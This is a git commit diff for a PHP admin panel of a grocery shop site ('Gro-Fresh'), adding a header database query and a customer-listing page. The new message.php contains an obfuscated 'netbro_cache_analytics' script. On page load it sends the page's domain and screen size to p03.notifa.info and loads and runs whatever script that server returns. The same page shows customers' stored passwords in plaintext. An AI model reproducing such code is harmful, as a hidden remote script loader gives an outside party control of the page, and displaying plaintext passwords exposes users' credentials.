0b23a146c1c0c8d8ccaf3b711d763b3353e4f73b
Faishal Arif Wibowo <39848110+16110271@users.noreply.github.com>
2018-12-18 23:50:28 +0700

    F - admin

--- admin/header admin.php
+++ admin/header admin.php
@@ -1,6 +1,7 @@
+<?php include '../system/koneksi.php' ?>
 <header>
-      <nav class="navbar navbar-expand-md navbar-light fixed-top bg-light">
-        <a class="navbar-brand" href="#"><img src="img/logofont.svg" width="150" height="auto" class="d-inline-block align-top" alt=""></a>
+      <nav class="navbar nav-tabs navbar-expand-md navbar-light fixed-top bg-light">
+        <a class="navbar-brand" href="#"><img src="../img/logofont.svg" width="150" height="auto" class="d-inline-block align-top" alt=""></a>
           <!--<img src="img/logo.png" width="30" height="30" class="d-inline-block align-top" alt="">-->
         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
           <span class="navbar-toggler-icon"></span>
@@ -11,18 +12,26 @@
               <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="#">Product</a>
+              <a class="nav-link" href="product.php">Product</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="quality.html">Quality</a>
+              <a class="nav-link" href="user.php">User</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="message.php">Message</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="#">Contact Us</a>
             </li>
           </ul>
+             <?php
+   $query = mysqli_query($con,"SELECT * FROM admin");
+   $record = mysqli_fetch_array($query);
+   
+   ?>
              <div class="dropdown">
-            ADMIN - Ray Reysandi  
-          <button class="dropbtn"><img src="user2.png"></button>
+            USER - <?php echo $record['nama_admin']; ?>
+          <button class="dropbtn"><img src="../img/user2.png"></button>
           <div class="dropdown-content">
             <a href="indexlogin.html"> Profile </a>
             <a href="history payment.html"> History </a>
---
+++ admin/message.php
@@ -0,0 +1,90 @@
+<?php include '../system/koneksi.php'; ?>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../../../favicon.ico">
+
+    <title>Gro-Fresh | Admin</title>
+    <?php include 'head.php'; ?>
+  </head>
+  <body>
+
+  	<?php include 'header admin.php'; ?>
+    
+    <main role="main">
+      <div id="myCarousel" class="carousel slide" data-ride="carousel">
+      </div>
+      <div class="container-fluid marketing">
+        <div class="row justify-content-lg-center">
+
+          <div class="col-lg-7">
+            <h3>User</h3>
+            <table class="table table-bordered">
+              <thead>
+                <tr>
+                  <th scope="col">Kode</th>
+                  <th scope="col">Nama</th>
+                  <th scope="col">Email</th>
+                  <th scope="col">Alamat</th>
+                  <th scope="col">Password</th>
+                  <th scope="col">Phone</th>
+                  <th colspan="2" scope="col">Action</th>
+                </tr>
+              </thead>
+              <tbody>
+                <?php
+                   $query = mysqli_query($con,"SELECT * FROM pelanggan");
+                   while ($record = mysqli_fetch_array($query)) {
+                ?>
+                <tr>
+                  <th scope="row"><?php echo $record['kd_pelanggan']; ?></th>
+                  <td><?php echo $record['nama_pelanggan']; ?></td>
+                  <td><?php echo $record['email']; ?></td>
+                  <td>@<?php echo $record['alamat']; ?></td>
+                  <td><?php echo $record['password']; ?></td>
+                  <td><?php echo $record['no_tlp']; ?></td>
+                  <td><a href="produksys.php?kd_produk=<?php echo $record['kd_produk']?>" class="btn"><i class="fa fa-edit"></i></a></td>
+                  <td><a href="produksys.php?kd_produk=<?php echo $record['kd_produk']?>" class="btn"><i class="fa fa-trash"></i></a></td>
+                </tr>
+                <?php } ?>
+              </tbody>
+            </table>
+            <button type="button-right" class="btn btn-primary">Add Product</button>
+          </div>
+
+          
+        </div>
+
+        <hr class="featurette-divider"> 
+    </main>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
+    <script src="../../assets/js/vendor/popper.min.js"></script>
+    <script src="assets/js/bootstrap.js"></script>
+    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
+    <script src="assets/js/holder.min.js"></script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+  <script src="vendor/animsition/js/animsition.min.js"></script>
+<!--===============================================================================================-->
+  <script src="vendor/bootstrap/js/popper.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+  <script src="vendor/select2/select2.min.js"></script>
+<!--===============================================================================================-->
+  <script src="vendor/daterangepicker/moment.min.js"></script>
+  <script src="vendor/daterangepicker/daterangepicker.js"></script>
+<!--===============================================================================================-->
+  <script src="vendor/countdowntime/countdowntime.js"></script>
+<!--===============================================================================================-->
+  <script src="assets/js/main.js"></script>
+</body>
+</html>
